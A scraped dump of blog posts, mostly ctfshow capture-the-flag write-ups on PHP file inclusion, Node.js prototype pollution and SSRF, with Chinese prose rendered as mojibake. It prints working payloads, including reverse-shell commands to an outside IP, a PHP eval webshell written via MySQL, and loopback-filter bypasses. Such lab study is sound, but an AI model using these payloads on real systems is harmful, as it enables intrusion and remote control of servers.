php-fpmæä¾›äº†æ›´å¥½çš„phpè¿›ç¨‹ç®¡ç†æ–¹å¼ï¼Œå¯ä»¥æœ‰æ•ˆçš„æ§åˆ¶å†…å­˜å’Œè¿›ç¨‹ï¼Œå¯ä»¥å¹³æ»‘é‡è½½phpé…ç½®ã€‚ æ€»ç»“ä¸€ä¸‹è¿™ä¸ªå‡çº§çš„è¿‡ç¨‹ï¼š å¦‚æœè¦æ­å»ºä¸€ä¸ªé«˜æ€§èƒ½çš„PHP WEBæœåŠ¡å™¨ï¼Œç›®å‰æœ€ä½³çš„æ–¹å¼æ˜¯Apache/Nginx + FastCGI + PHP-FPM(+PHP-CGI)æ–¹å¼äº†ã€‚ ç»“å°¾è¿™ç¯‡æ–‡ç« è½¬è½½äº å¤§ä½¬ æˆ‘åœ¨æˆ‘çš„vpsä¸­nginxç”¨çš„å°±æ˜¯ fastcgi+php-fpm 1234location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;}","link":"/2023/11/08/cgi%EF%BC%8Cphp-cgi%EF%BC%8Cfastcgi%20%E3%80%81php-fpm%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/"},{"title":"ctfshow(include)","text":"web78(php://filter)123456if(isset($_GET['file'])){ $file = $_GET['file']; include($file);}else{ highlight_file(__FILE__);} payload åˆ©ç”¨php://filteråè®® 1?file=php://filter/convert.base64-encode/resource=flag.php web79(data)1234567if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); include($file);}else{ highlight_file(__FILE__);} payload è¿™é‡Œä¸Šä¸€é¢˜çš„æ–¹æ³•å¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡ï¼›ä½†æ˜¯ä¹Ÿå¯ä»¥å€ŸåŠ©dataåè®®:includeé…åˆdataå¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ; 1234?file=data://text/plain,&lt;?pHp system('cat flag*');?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; &lt;?php system('cat flag.php'); web80-81(log_file)åŒ…å«æ—¥å¿—æ–‡ä»¶ï¼Œ 1?file=/var/log/nginx/access.log æ³¨æ„æ—¥å¿—æ–‡ä»¶æƒé™ä¸€èˆ¬ä¸ºï¼š 12ls -al /var/log/nginx/access.log-rw-r----- 1 www-data adm 0 1æœˆ13æ—¥ 22:29 /var/log/nginx/access.log web82-86(session)å¯ä»¥çœ‹æˆ‘è¿™ç¯‡åšå®¢ https://zixyd.github.io/2024/01/07/session%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/#session-upload-progress web87(php://fiteræ­»äº¡ç»•è¿‡)12345678910111213if(isset($_GET['file'])){ $file = $_GET['file']; $content = $_POST['content']; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); file_put_contents(urldecode($file), &quot;&lt;?php die('å¤§ä½¬åˆ«ç§€äº†');?&gt;&quot;.$content); }else{ highlight_file(__FILE__);} åˆ©ç”¨base64 4ä½å¯†æ–‡ä¸ºä¸€ä¸ªæ˜æ–‡çš„ç‰¹æ€§1php://filter/write=convert.base64-decode/resource=1.php 1GETï¼š?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30 1POST: content=aaPD9waHAgc3lzdGVtKCRfUE9TVFsxXSk7Pz4= åˆ©ç”¨string.rot13è¿‡æ»¤å™¨æ„é€ ï¼š 1php://filter/write=string.rot13/resource=2.php web88(data)123456789if(isset($_GET['file'])){ $file = $_GET['file']; if(preg_match(&quot;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i&quot;, $file)){ die(&quot;error&quot;); } include($file);}else{ highlight_file(__FILE__);} å‘ç°è¿‡æ»¤çš„è¿˜æ˜¯æ¯”è¾ƒå¤šï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤ : é‚£æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨PHPä¼ªåè®®å°±æ˜¯ è¿™é‡Œä½¿ç”¨çš„æ˜¯ data://text/plain;base64,poc å…¶å®å’Œ79å·®ä¸å¤š åªæ˜¯æ³¨æ„çš„æ˜¯ç¼–ç æˆbase64çš„æ—¶å€™è¦å»æ‰ ï¼ å®é™…ä¸Šå°±æ˜¯å»æ‰base64åçš„=ï¼Œä½œä¸ºå¡«å……ä½¿ç”¨ï¼Œä¸å½±å“ç»“æœ 1?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4 web116(misc)ä¿å­˜è§†é¢‘ï¼Œç”¨winhexæ‰“å¼€å‘ç°åŒ…å«pngå›¾ç‰‡ï¼Œåˆ†ç¦»å‡ºæ¥,å¯ä»¥çœ‹åˆ°æºç  payload,éœ€è¦æŠ“åŒ…ï¼Œmiscï¼Œæ²¡æ„æ€ 1?file=flag.php web117(file_pust_contentæ­»äº¡ç»•è¿‡)1234567891011highlight_file(__FILE__);error_reporting(0);function filter($x){ if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){ die('too young too simple sometimes naive!'); }}$file=$_GET['file'];$contents=$_POST['contents'];filter($file);file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents); payload é€šè¿‡usc-2çš„ç¼–ç è¿›è¡Œè½¬æ¢ï¼›å¯¹ç›®æ ‡å­—ç¬¦ä¸²è¿›è¡Œ2ä½ä¸€åè½¬ï¼›ï¼ˆå› ä¸ºæ˜¯ä¸¤ä½ä¸€åè½¬ï¼Œæ‰€ä»¥å­—ç¬¦çš„æ•°ç›®éœ€è¦ä¿æŒåœ¨å¶æ•°ä½ä¸Šï¼‰ file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜ 12file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?","link":"/2024/01/18/ctfshow(include)/"},{"title":"ctfshow(nodejs)","text":"web334(toUpperCase)123456#user.jsmodule.exports = { items: [ {username: 'CTFSHOW', password: '123456'} ]}; 1234567891011121314151617181920212223242526272829303132333435#login.jsvar express = require('express');var router = express.Router();var users = require('../modules/user').items; var findUser = function(name, password){ return users.find(function(item){ return name!=='CTFSHOW' &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; });};/* GET home page. */router.post('/', function(req, res, next) { res.type('html'); var flag='flag_here'; var sess = req.session; var user = findUser(req.body.username, req.body.password); if(user){ req.session.regenerate(function(err) { if(err){ return res.json({ret_code: 2, ret_msg: 'ç™»å½•å¤±è´¥'}); } req.session.loginUser = user.username; res.json({ret_code: 0, ret_msg: 'ç™»å½•æˆåŠŸ',ret_flag:flag}); }); }else{ res.json({ret_code: 1, ret_msg: 'è´¦å·æˆ–å¯†ç é”™è¯¯'}); } });module.exports = router; å­˜åœ¨é€»è¾‘æ¼æ´ 1return name!=='CTFSHOW' &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; ç”¨å°å†™ç”¨æˆ·åç™»é™† 12ctfshow123456 web335(child_process)æŸ¥çœ‹æºä»£ç  1&lt;!-- /?eval= --&gt; evalåœ¨nodejsä¸­ä¹Ÿæ˜¯å¯ä»¥å°†å‚æ•°å½“ä½œnodejsä»£ç æ‰§è¡Œçš„,å’Œphpç±»ä¼¼ 1eval(console.log(require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString())); payload 1?eval=require(&quot;child_process&quot;).execSync(&quot;cat f*&quot;).toString() web336(execè¿‡æ»¤)å’Œä¸Šé¢˜åŸºæœ¬ç±»ä¼¼ï¼Œåªæ˜¯è¿‡æ»¤äº†â€™execâ€™ï¼› å¯ä»¥ç”¨+æ‹¼æ¥ç»•è¿‡ 1?eval=require(&quot;child_process&quot;)['exe'%2B'cSync']('ls').toString() æˆ–è€…ç”¨spawnSync 1?eval=require( 'child_process' ).spawnSync( 'ls', [ '/' ] ).stdout.toString() web337(md5ç»•è¿‡)ç»™äº†æºç  12345678910111213141516171819202122232425var express = require('express');var router = express.Router();var crypto = require('crypto');function md5(s) { return crypto.createHash('md5') .update(s) .digest('hex');}/* GET home page. */router.get('/', function(req, res, next) { res.type('html'); var flag='xxxxxxx'; var a = req.query.a; var b = req.query.b; if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)){ res.end(flag); }else{ res.render('index',{ msg: 'tql'}); } });module.exports = router; ä¸Šé¢æ˜¯å¯¹è±¡ï¼Œä¸‹é¢æ˜¯æ•°ç»„ï¼› 123456789101112131415let a = {'x':1}let b = {'x':2}console.log(a+&quot;flag{xxx}&quot;)console.log(b+&quot;flag{xxx}&quot;)a = [1]b = [2]console.log(a+&quot;flag{xxx}&quot;)console.log(b+&quot;flag{xxx}&quot;)var a =[1]console.log(a)console.log(typeof a); //object payloadï¼Œæ›´å‡†ç¡®çš„æ¥è®²æ˜¯ç”¨å¯¹è±¡ç»•è¿‡md5 1?a[c]=2&amp;b[c]=3 web338(pollution)è€ƒçš„åŸå‹é“¾æ±¡æŸ“ï¼Œå¯ä»¥çœ‹æˆ‘è¿™ç¯‡åšå®¢ï¼Œ https://zixyd.github.io/2024/01/31/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/ ç»™äº†æºç  123456789101112131415router.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); var flag='flag_here'; var secert = {}; var sess = req.session; let user = {}; utils.copy(user,req.body); if(secert.ctfshow==='36dboy'){ res.end(flag); }else{ return res.json({ret_code: 2, ret_msg: 'ç™»å½•å¤±è´¥'+JSON.stringify(user)}); } }); å…¶ä¸­utils.copyï¼Œå°±æ˜¯ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“æ¼æ´åˆ©ç”¨ç‚¹ 123456789function copy(object1, object2){ for (let key in object2) { if (key in object2 &amp;&amp; key in object1) { copy(object1[key], object2[key]) } else { object1[key] = object2[key] } } } web339(RCE)12345678910111213141516#login.jsrouter.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); var flag='flag_here'; var secert = {}; var sess = req.session; let user = {}; utils.copy(user,req.body); if(secert.ctfshow===flag){ res.end(flag); }else{ return res.json({ret_code: 2, ret_msg: 'ç™»å½•å¤±è´¥'+JSON.stringify(user)}); } }); 123456#api.jsrouter.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); res.render('api', { query: Function(query)(query)}); }); ç”±äºæˆ‘ä»¬å¹¶ä¸çŸ¥é“flagçš„å€¼ï¼Œæ— æ³•é€šè¿‡res.end(flag);æ¥è·å–flagï¼Œåªèƒ½é€šè¿‡apiä¸­çš„{ query: Function(query)(query)}æ¥rceè·å–flag; è¿™ç§å½¢å¼ï¼Œåªè¦queryçš„å€¼å¯ä»¥æ§åˆ¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œqueryçš„å€¼å¯ä»¥é€šè¿‡copyå‡½æ•°åŸå‹é“¾æ±¡æŸ“æ§åˆ¶ Functionç¯å¢ƒä¸‹æ²¡æœ‰requireå‡½æ•°ï¼Œä¸èƒ½è·å¾—child_processæ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨process.mainModule.constructor._loadæ¥ä»£æ›¿requireã€‚ 1{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/81.71.13.76/5557 0&gt;&amp;1\\&quot;')&quot;}} ä¸‹é¢è¿™ä¸ªpayloadæ˜¯ejsä½ç‰ˆæœ¬å­˜åœ¨æ¼æ´ https://blog.csdn.net/lastwinn/article/details/128914419 1234567{ &quot;constructor&quot;: { &quot;prototype&quot;: { &quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/81.71.13.76/5557 0&gt;&amp;1\\&quot;');var __tmp2&quot; } }} web340(rce)1234567891011121314151617#login.jsrouter.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); var flag='flag_here'; var user = new function(){ this.userinfo = new function(){ this.isVIP = false; this.isAdmin = false; this.isAuthor = false; }; } utils.copy(user.userinfo,req.body); if(user.userinfo.isAdmin){ res.end(flag); }else{ return res.json({ret_code: 2, ret_msg: 'ç™»å½•å¤±è´¥'}); } å’Œä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œuser.userinfoçš„ä¸Šä¸€çº§æ˜¯user,userçš„ä¸Šä¸€çº§æ‰æ˜¯åŸç”Ÿï¼›åªéœ€è¦æ±¡æŸ“ä¸¤çº§ 1{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1\\&quot;')&quot;}}} web341(ejs)ä»ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šå°‘äº†apiæ–‡ä»¶ï¼Œé‚£ä¹ˆåªèƒ½ç”¨ejsçš„payloadå»æ‰“ 1{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/81.71.13.76/5555 0&gt;&amp;1\\&quot;');var __tmp2&quot;}}} web342-343(jade)å’Œä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œåªä¸è¿‡æ¸²æŸ“å¼•æ“æ¢æˆäº†jade 1app.engine('jade', require('jade').__express); https://www.anquanke.com/post/id/236354#h2-3 payload 123{&quot;__proto__&quot;:{&quot;__proto__&quot;: {&quot;type&quot;:&quot;Code&quot;,&quot;compileDebug&quot;:true,&quot;self&quot;:true,&quot;line&quot;:&quot;0, \\&quot;\\&quot; ));return global.process.mainModule.constructor._load('child_process').execSync('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/81.71.13.76/5556 0&gt;&amp;1\\&quot;');//&quot;}}} {&quot;__proto__&quot;:{&quot;__proto__&quot;: {&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/xx/6666 0&gt;&amp;1\\&quot;')&quot;}}} web344(,)1234567891011121314router.get('/', function(req, res, next) { res.type('html'); var flag = 'flag_here'; if(req.url.match(/8c|2c|\\,/ig)){ res.end('where is flag :)'); } var query = JSON.parse(req.query.query); if(query.name==='admin'&amp;&amp;query.password==='ctfshow'&amp;&amp;query.isVIP===true){ res.end(flag); }else{ res.end('where is flag. :)'); }}); æœ¬æ¥æ˜¯ 1?query={&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true} ä½†æ˜¯é¢˜ç›®è¿‡æ»¤äº†é€—å· 1?query={&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true} nodejsä¸­ä¼šæŠŠè¿™ä¸‰éƒ¨åˆ†æ‹¼æ¥èµ·æ¥ï¼Œä¸ºä»€ä¹ˆæŠŠctfshowä¸­çš„cç¼–ç å‘¢ï¼Œå› ä¸ºåŒå¼•å·çš„urlç¼–ç æ˜¯%22å†å’Œcè¿æ¥èµ·æ¥å°±æ˜¯%22cï¼Œä¼šåŒ¹é…åˆ°æ­£åˆ™è¡¨è¾¾å¼ã€‚","link":"/2024/02/01/ctfshow(nodejs)/"},{"title":"ctfshow(ssrf)","text":"web3511234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt; å…¶ä¸­ï¼Œcurl_init()å‡½æ•°ç”¨äºåˆå§‹åŒ–ä¸€ä¸ªCURLå¯¹è±¡ï¼Œcurl_setopt()å‡½æ•°ç”¨äºè®¾ç½®CURLè¯·æ±‚çš„é€‰é¡¹ï¼Œcurl_exec()å‡½æ•°ç”¨äºæ‰§è¡ŒCURLè¯·æ±‚å¹¶è·å–å“åº”ç»“æœï¼Œcurl_close()å‡½æ•°ç”¨äºå…³é—­CURLå¯¹è±¡ã€‚ ä½¿ç”¨curl_setopt()å‡½æ•°è®¾ç½®äº†è¯·æ±‚çš„URLã€CURLOPT_RETURNTRANSFERé€‰é¡¹å’ŒCURLOPT_HEADERé€‰é¡¹ã€‚å…¶ä¸­ï¼ŒCURLOPT_RETURNTRANSFERé€‰é¡¹è®¾ç½®ä¸º1æ—¶ï¼Œè¡¨ç¤ºå°†è·å–çš„å“åº”ç»“æœä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›ã€‚CURLOPT_HEADERé€‰é¡¹è®¾ç½®ä¸º0æ—¶ï¼Œåˆ™è¡¨ç¤ºåœ¨å“åº”ç»“æœä¸­ä¸åŒ…å«å“åº”å¤´éƒ¨ä¿¡æ¯ã€‚ payload 1POST:url=http://127.0.0.1/flag.php web352-353(å›ç¯åœ°å€ç»•è¿‡)12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if($x['scheme']==='http'||$x['scheme']==='https'){if(!preg_match('/localhost|127.0.0/')){$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);}else{ die('hacker');}}else{ die('hacker');}?&gt; parse_urlå‡½æ•° 1234567891011121314$url = 'http://username:password@hostname/path?arg=value#anchor';print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);è¾“å‡º:Array([scheme] =&gt; http[host] =&gt; hostname[user] =&gt; username[pass] =&gt; password[path] =&gt; /path[query] =&gt; arg=value[fragment] =&gt; anchor) å¯åˆ©ç”¨ä¸€ä¸ªåœ¨çº¿ç½‘ç«™ï¼šIPåœ°å€è½¬åŒ–ä¸ºè¿›åˆ¶åœ°å€https://tool.520101.com/wangluo/jinzhizhuanhuan/ payload: ipåœ°å€è¿˜å¯ä»¥ç”¨åè¿›åˆ¶ï¼Œå…«è¿›åˆ¶ï¼Œåå…­è¿›åˆ¶è¡¨ç¤º 123456url=http://0x7f.0.0.1/flag.phpurl=http://0177.0.0.1/flag.phpurl=http://0.0.0.0/flag.php 0.0.0.0ä»£è¡¨æœ¬æœºurl=http://0x7F000001/flag.php 16è¿›åˆ¶åœ°å€url=http://2130706433/flag.php 10è¿›åˆ¶åœ°å€url=http://127.1/flag.php web354(DNS_Aè®°å½•)12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if($x['scheme']==='http'||$x['scheme']==='https'){if(!preg_match('/localhost|1|0|ã€‚/i', $url)){$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);}else{ die('hacker');}}else{ die('hacker');}?&gt; æ–¹æ³•ä¸€ ç”¨DNS-Rebinding åˆ©ç”¨ä¸‹é¢è¿™ä¸ªç½‘ç«™ https://lock.cmpxchg8b.com/rebinder.html å¯æƒœçš„åŸŸåé‡Œé¢æœ‰0å’Œ1 æ–¹æ³•äºŒ æ›´æ”¹è‡ªå·±çš„åŸŸåçš„Aè®°å½•ä¸º127.0.0.1 payload(æ³¨æ„dnsç¼“å­˜) 1url=http://langblog.top/flag.php è¡¥å…… å¥½åƒè¿˜å¯ä»¥ç”¨302é‡å®šå‘ç»•è¿‡ https://www.bilibili.com/video/BV1yN4y147qK/?spm_id_from=333.788&amp;vd_source=556180919ced41bfcd02c06776ecf153 web355(é•¿åº¦é™åˆ¶)1234567891011121314151617181920212223&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if($x['scheme']==='http'||$x['scheme']==='https'){$host=$x['host'];if((strlen($host)&lt;=5)){$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);}else{ die('hacker');}}else{ die('hacker');}?&gt; 0åœ¨windowsä¸­è¢«è§£æä¸º0.0.0.0ã€‚åœ¨Linuxä¸­è¢«è§£æä¸º127.0.0.1 payload 12url=http://0/flag.phpurl=http://127.01/flag.php web356(é•¿åº¦é™åˆ¶)1234567891011121314151617181920212223&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if($x['scheme']==='http'||$x['scheme']==='https'){$host=$x['host'];if((strlen($host)&lt;=3)){$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);}else{ die('hacker');}}else{ die('hacker');}?&gt; payload 1url=http://0/flag.php web357(DNS Rebinding)12345678910111213141516171819&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if($x['scheme']==='http'||$x['scheme']==='https'){$ip = gethostbyname($x['host']);echo '&lt;/br&gt;'.$ip.'&lt;/br&gt;';if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) { die('ip!');}echo file_get_contents($_POST['url']);}else{ die('scheme');}?&gt; gethostbynameå‡½æ•°ç”¨äºè·å–æŒ‡å®šä¸»æœºåçš„IPåœ°å€ã€‚åœ¨è¿™é‡Œï¼Œ$x[â€˜hostâ€™]æ˜¯ä¸€ä¸ªæ•°ç»„$xä¸­çš„å…ƒç´ ï¼Œ[â€˜hostâ€™]æ˜¯æ•°ç»„$xä¸­çš„ä¸€ä¸ªé”®ã€‚è¿™è¡Œä»£ç çš„ä½œç”¨æ˜¯å°†$x[â€˜hostâ€™]å¯¹åº”çš„ä¸»æœºåè§£æä¸ºIPåœ°å€ï¼Œå¹¶å°†ç»“æœèµ‹ç»™å˜é‡$ipã€‚ !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) ä½œç”¨æ˜¯æ£€æŸ¥å˜é‡$ipæ˜¯å¦ä¸ºä¸€ä¸ªåˆæ³•çš„å…¬å…±IPåœ°å€ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™è¾“å‡ºâ€™ip!â€™å¹¶ç»ˆæ­¢ç¨‹åºã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒä½¿ç”¨äº†PHPä¸­çš„filter_varå‡½æ•°ï¼Œç»“åˆäº†FILTER_VALIDATE_IPã€FILTER_FLAG_NO_PRIV_RANGEå’ŒFILTER_FLAG_NO_RES_RANGEä¸‰ä¸ªè¿‡æ»¤å™¨ã€‚è¿™äº›è¿‡æ»¤å™¨çš„ä½œç”¨æ˜¯éªŒè¯IPåœ°å€çš„æ ¼å¼ï¼Œå¹¶æ’é™¤ç§æœ‰IPåœ°å€å’Œä¿ç•™IPåœ°å€ åˆ©ç”¨DNS Rebindingå¯ä»¥ç»•è¿‡ç¬¬ä¸€æ¬¡çš„æ£€æŸ¥ DNSé‡æ–°ç»‘å®šæ˜¯è®¡ç®—æœºæ”»å‡»çš„ä¸€ç§å½¢å¼ã€‚ åœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œæ¶æ„ç½‘é¡µä¼šå¯¼è‡´è®¿é—®è€…è¿è¡Œå®¢æˆ·ç«¯è„šæœ¬ï¼Œæ”»å‡»ç½‘ç»œä¸Šå…¶ä»–åœ°æ–¹çš„è®¡ç®—æœºã€‚ ä»ç†è®ºä¸Šè®²ï¼ŒåŒæºç­–ç•¥å¯é˜²æ­¢å‘ç”Ÿè¿™ç§æƒ…å†µï¼šå®¢æˆ·ç«¯è„šæœ¬åªèƒ½è®¿é—®ä¸ºè„šæœ¬æä¾›æœåŠ¡çš„åŒä¸€ä¸»æœºä¸Šçš„å†…å®¹ã€‚ æ¯”è¾ƒåŸŸåæ˜¯å®æ–½æ­¤ç­–ç•¥çš„é‡è¦éƒ¨åˆ†ï¼Œå› æ­¤DNSé‡æ–°ç»‘å®šé€šè¿‡æ»¥ç”¨åŸŸåç³»ç»Ÿï¼ˆDNSï¼‰æ¥ç»•è¿‡è¿™ç§ä¿æŠ¤ã€‚è¿™ç§æ”»å‡»å¯ä»¥é€šè¿‡è®©å—å®³è€…çš„ç½‘ç»œæµè§ˆå™¨è®¿é—®ä¸“ç”¨IPåœ°å€çš„æœºå™¨å¹¶å°†ç»“æœè¿”å›ç»™æ”»å‡»è€…æ¥ç ´åä¸“ç”¨ç½‘ç»œã€‚ å®ƒä¹Ÿå¯ä»¥ç”¨äºä½¿ç”¨å—å®³è€…æœºå™¨å‘é€åƒåœ¾é‚®ä»¶ï¼Œåˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»æˆ–å…¶ä»–æ¶æ„æ´»åŠ¨ã€‚ payload 1web354çš„æ–¹æ³•ä¸€ web358(URL bypass)12345678&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if(preg_match('/^http:\\/\\/ctf\\..*show$/i',$url)){ echo file_get_contents($url);} æ­£åˆ™è¡¨è¾¾å¼çš„æ„æ€æ˜¯ä»¥http://ctf.å¼€å¤´ï¼Œä»¥showç»“å°¾ã€‚ 123456â”Œâ”€â”€(rootã‰¿kali)-[/var/www/html]â””â”€# echo &quot;flag{this is test }&quot; &gt; flag.php â”Œâ”€â”€(rootã‰¿kali)-[/var/www/html]â””â”€# curl http://ctf.@127.0.0.1/flag.php?showflag{this is test } æŠŠctf.å½“æˆusernameï¼Œä¸å½±å“åœ°å€è§£æ 123456789101112131415161718&lt;?php$url=&quot;http://ctf.@127.0.0.1/flag.php?show&quot;;$url=parse_url($url);var_dump($url);?&gt;array(5) { [&quot;scheme&quot;]=&gt; string(4) &quot;http&quot; [&quot;host&quot;]=&gt; string(9) &quot;127.0.0.1&quot; [&quot;user&quot;]=&gt; string(4) &quot;ctf.&quot; [&quot;path&quot;]=&gt; string(9) &quot;/flag.php&quot; [&quot;query&quot;]=&gt; string(4) &quot;show&quot;} payload 1http://ctf.@127.0.0.1/flag.php?show web359(Mysql)123456789&lt;/div&gt; &lt;form action=&quot;check.php&quot; method=&quot;post&quot;&gt; &lt;input name=&quot;u&quot; type=&quot;text&quot; class=&quot;text&quot; value=&quot;Username&quot; onfocus=&quot;this.value = '';&quot; onblur=&quot;if (this.value == '') {this.value = 'Username';}&quot; &gt; &lt;div class=&quot;key&quot;&gt; &lt;input password=&quot;p&quot; type=&quot;password&quot; value=&quot;Password&quot; onfocus=&quot;this.value = '';&quot; onblur=&quot;if (this.value == '') {this.value = 'Password';}&quot;&gt; &lt;/div&gt; &lt;input type=&quot;hidden&quot; name=&quot;returl&quot; value=&quot;https://404.chall.ctf.show/&quot;&gt; &lt;div class=&quot;signin&quot;&gt; åˆ©ç”¨ç‚¹åœ¨returl,åˆ©ç”¨gopheruså·¥å…·æ‰“æ— å¯†ç mysqlï¼Œå¹¶ä¸”çŸ¥é“æ•°æ®åº“çš„usernameï¼› åœ¨éäº¤äº’æ¨¡å¼ä¸‹ç™»å½•å¹¶æ“ä½œMySQLåªèƒ½åœ¨æ— éœ€å¯†ç è®¤è¯æƒ…å†µä¸‹è¿›è¡Œ, 12345./gopherus.py --exploit mysqlusername:rootå†™å…¥ä¸€å¥è¯æœ¨é©¬select &quot;&lt;?php @eval($_POST['cmd']);?&gt;&quot; into outfile '/var/www/html/shell.php'; payload 